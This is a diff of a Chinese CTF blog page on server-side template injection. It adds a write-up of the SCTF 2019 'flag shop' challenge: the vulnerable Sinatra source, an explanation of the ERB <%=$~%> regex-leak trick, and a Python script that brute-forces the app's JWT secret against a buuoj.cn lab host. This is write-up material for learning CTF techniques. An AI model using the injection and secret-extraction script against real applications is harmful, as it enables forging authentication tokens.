@@ -82,14 +82,16 @@
 
 
 
-<meta name="description" content="CISCN2019 华东南赛区]Web11 开局一个api界面 ,  看到xff, Smarty, 和右上角的东东… 这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2 http://www.heetian.com/info/634 payload 123curl http://node3.buuoj.cn:27068/ -H &amp;quo">
+<meta name="description" content="SCTF 2019 flag shop robots.txt 提示 ,找到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848">
 <meta name="keywords" content="CTF WEB">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SSTI 题型记录[working forever]">
 <meta property="og:url" content="http://yoursite.com/2019/05/27/SSTI/index.html">
 <meta property="og:site_name" content="CH4SER || 自闭室">
-<meta property="og:description" content="CISCN2019 华东南赛区]Web11 开局一个api界面 ,  看到xff, Smarty, 和右上角的东东… 这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2 http://www.heetian.com/info/634 payload 123curl http://node3.buuoj.cn:27068/ -H &amp;quo">
+<meta property="og:description" content="SCTF 2019 flag shop robots.txt 提示 ,找到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/images/image-20191231170305900.png">
+<meta property="og:image" content="http://yoursite.com/images/image-20191231170332653.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/71469592-a5829480-2804-11ea-86e1-a0f6241ee3a2.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511159-69aefc00-aa28-11e9-8de3-1650041e14a1.png">
@@ -98,11 +100,11 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511254-b561a580-aa28-11e9-8e54-c89fcf20690b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/61511291-ce6a5680-aa28-11e9-8525-0c66dd03c840.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/57853604-c1f33300-7818-11e9-8665-a592056576e0.png">
-<meta property="og:updated_time" content="2019-12-28T18:11:07.246Z">
+<meta property="og:updated_time" content="2019-12-31T09:04:43.893Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SSTI 题型记录[working forever]">
-<meta name="twitter:description" content="CISCN2019 华东南赛区]Web11 开局一个api界面 ,  看到xff, Smarty, 和右上角的东东… 这题考察smarty模板注入, 注入点在X-Forwarded-For头部, 可以试试{1+1}, 确实会返回2 http://www.heetian.com/info/634 payload 123curl http://node3.buuoj.cn:27068/ -H &amp;quo">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png">
+<meta name="twitter:description" content="SCTF 2019 flag shop robots.txt 提示 ,找到源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848">
+<meta name="twitter:image" content="http://yoursite.com/images/image-20191231170305900.png">
 
 
 
@@ -342,8 +344,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-12-29T02:11:07+08:00">
-                2019-12-29
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-31T17:04:43+08:00">
+                2019-12-31
               </time>
             
           </span>
@@ -392,7 +394,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  614
+                  1.2k
                 </span>
               
 
@@ -408,7 +410,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  3
+                  6
                 </span>
               
             </div>
@@ -429,7 +431,20 @@
       
 
       
-        <h2 id="CISCN2019-华东南赛区-Web11">CISCN2019 华东南赛区]Web11</h2>
+        <h2 id="SCTF-2019-flag-shop">SCTF 2019 flag shop</h2>
+<p>robots.txt 提示 ,找到源码</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/cookies'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'sinatra/json'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'jwt'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'securerandom'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'erb'</span></span><br><span class="line"></span><br><span class="line">set <span class="symbol">:public_folder</span>, File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/static'</span></span><br><span class="line"></span><br><span class="line">FLAGPRICE = <span class="number">1000000000000000000000000000</span></span><br><span class="line">ENV[<span class="string">"SECRET"</span>] = SecureRandom.hex(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  enable <span class="symbol">:logging</span></span><br><span class="line">  file = File.new(File.dirname(__FILE_<span class="number">_</span>) + <span class="string">'/../log/http.log'</span>,<span class="string">"a+"</span>)</span><br><span class="line">  file.sync = <span class="literal">true</span></span><br><span class="line">  use Rack::CommonLogger, file</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/"</span> <span class="keyword">do</span></span><br><span class="line">  redirect <span class="string">'/shop'</span>, <span class="number">302</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/filebak"</span> <span class="keyword">do</span></span><br><span class="line">  content_type <span class="symbol">:text</span></span><br><span class="line">  erb IO.binread __FILE_<span class="number">_</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/auth"</span> <span class="keyword">do</span></span><br><span class="line">  payload = &#123; <span class="symbol">uid:</span> SecureRandom.uuid , <span class="symbol">jkl:</span> <span class="number">20</span>&#125;</span><br><span class="line">  auth = JWT.encode payload,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">  cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/api/info"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  json(&#123;<span class="symbol">uid:</span> auth[<span class="number">0</span>][<span class="string">"uid"</span>],<span class="symbol">jkl:</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>]&#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  erb <span class="symbol">:shop</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">"/work"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line">  auth = auth[<span class="number">0</span>]</span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:SECRET</span>].<span class="literal">nil</span>?</span><br><span class="line">    <span class="keyword">if</span> ENV[<span class="string">"SECRET"</span>].match(<span class="string">"<span class="subst">#&#123;params[<span class="symbol">:SECRET</span>].match(<span class="regexp">/[0-9a-z]+/</span>)&#125;</span>"</span>)</span><br><span class="line">      puts ENV[<span class="string">"FLAG"</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> params[<span class="symbol">:do</span>] == <span class="string">"<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> is working"</span> <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    auth[<span class="string">"jkl"</span>] = auth[<span class="string">"jkl"</span>].to_i + SecureRandom.random_number(<span class="number">10</span>)</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    ERB::new(<span class="string">"&lt;script&gt;alert('<span class="subst">#&#123;params[<span class="symbol">:name</span>][<span class="number">0</span>,<span class="number">7</span>]&#125;</span> working successfully!')&lt;/script&gt;"</span>).result</span><br><span class="line"></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">"/shop"</span> <span class="keyword">do</span></span><br><span class="line">  islogin</span><br><span class="line">  auth = JWT.decode cookies[<span class="symbol">:auth</span>],ENV[<span class="string">"SECRET"</span>] , <span class="literal">true</span>, &#123; <span class="symbol">algorithm:</span> <span class="string">'HS256'</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> auth[<span class="number">0</span>][<span class="string">"jkl"</span>] &lt; FLAGPRICE <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"error"</span>,<span class="symbol">message:</span> <span class="string">"no enough jkl"</span>&#125;)</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    auth &lt;&lt; &#123;<span class="symbol">flag:</span> ENV[<span class="string">"FLAG"</span>]&#125;</span><br><span class="line">    auth = JWT.encode auth,ENV[<span class="string">"SECRET"</span>] , <span class="string">'HS256'</span></span><br><span class="line">    cookies[<span class="symbol">:auth</span>] = auth</span><br><span class="line">    json(&#123;<span class="symbol">title:</span> <span class="string">"success"</span>,<span class="symbol">message:</span> <span class="string">"jkl is good thing"</span>&#125;)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">islogin</span></span></span><br><span class="line">  <span class="keyword">if</span> cookies[<span class="symbol">:auth</span>].<span class="literal">nil</span>? <span class="keyword">then</span></span><br><span class="line">    redirect to(<span class="string">'/shop'</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+<p>代码能看懂, 就是不知道这个东西是<code>ERB</code>模板注入. …</p>
+<p>访问<code>/work</code>的时候带上两个参数<code>name</code>和<code>do</code>, 如果do的内容是name的字符串加上 is working的话就往下走.在最终的结果中把name输出出来.</p>
+<blockquote>
+<p>没发觉是模板注入可能是因为不够敏感吧…</p>
+</blockquote>
+<p>然后又是一个没学过的东西<code>&lt;%=$~%&gt;</code>这个东西, 尖括号百分号和等号是相当于模板, 里面执行代码, <code>$~</code>这个东西代表了上一个正则匹配的内容(这都是什么玩意啊哭).因为源码中限制了只读取name的最大七个字符, 所以长一点的1+1都不行. 通过逐次正则匹配SECRET得到secret, 并用它去生成新的secret, 从而可以购买flag</p>
+<p>注secret脚本如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://b81a8f39-4224-4747-a2d7-f27a1ff4cfed.node3.buuoj.cn/work?name=%3c%25%3d%24%7e%25%3e&amp;do=%3c%25%3d%24%7e%25%3e%20is%20working&amp;SECRET="</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.get(<span class="string">"http://b81a8f39-4224-4747-a2d7-f27a1ff4cfed.node3.buuoj.cn/api/auth"</span>)</span><br><span class="line"></span><br><span class="line">secret = <span class="string">"2202b389684933646313a1bd8a6bc021ee4277bf191dbd270ccade2c9c5c6f4b74308094d863799ae846ef4694d0006e8512efe8c6272d194ccb0c2914da5"</span></span><br><span class="line">trigger = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"0123456789abcdef"</span>:</span><br><span class="line">        <span class="keyword">if</span> trigger==<span class="number">0</span>:</span><br><span class="line">            tmp = i+secret</span><br><span class="line">            print(url+tmp)</span><br><span class="line">            res = sess.get(url+tmp, allow_redirects=<span class="literal">False</span>).content</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            print(res)</span><br><span class="line">            print(len(res))</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> len(res)&gt;<span class="number">48</span>:</span><br><span class="line">                secret = tmp</span><br><span class="line">                print(secret)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> i==<span class="string">"f"</span>:</span><br><span class="line">                trigger = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> trigger==<span class="number">1</span>:</span><br><span class="line">            tmp = secret+i</span><br><span class="line">            res = sess.get(url+tmp, allow_redirects=<span class="literal">False</span>).content</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            print(res)</span><br><span class="line">            print(len(res))</span><br><span class="line">            <span class="keyword">if</span> len(res)&gt;<span class="number">48</span>:</span><br><span class="line">                secret = tmp</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> i==<span class="string">"f"</span>:</span><br><span class="line">                print(secret)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20191231170305900.png" alt="image-20191231170305900"></p>
+<p><img src="/images/image-20191231170332653.png" alt="image-20191231170332653"></p>
+<h2 id="CISCN2019-华东南赛区-Web11">CISCN2019 华东南赛区 Web11</h2>
 <p>开局一个api界面 ,</p>
 <p><img src="https://user-images.githubusercontent.com/40637063/71469081-0dd07680-2803-11ea-9056-a078087a7001.png" alt="image"></p>
 <p>看到xff, Smarty, 和右上角的东东…</p>
@@ -590,7 +605,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">38</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -678,7 +693,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">1.</span> <span class="nav-text">CISCN2019 华东南赛区]Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">2.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">3.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SCTF-2019-flag-shop"><span class="nav-number">1.</span> <span class="nav-text">SCTF 2019 flag shop</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2019-华东南赛区-Web11"><span class="nav-number">2.</span> <span class="nav-text">CISCN2019 华东南赛区 Web11</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2018护网杯easy-tornado"><span class="nav-number">3.</span> <span class="nav-text">2018护网杯easy_tornado</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#百度杯-Fuzz"><span class="nav-number">4.</span> <span class="nav-text">百度杯 Fuzz</span></a></li></ol></div>
             
 
           </div>
@@ -698,7 +713,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -712,7 +727,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">63.1k</span>
+    <span title="Site words total count">65k</span>
   
 
   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
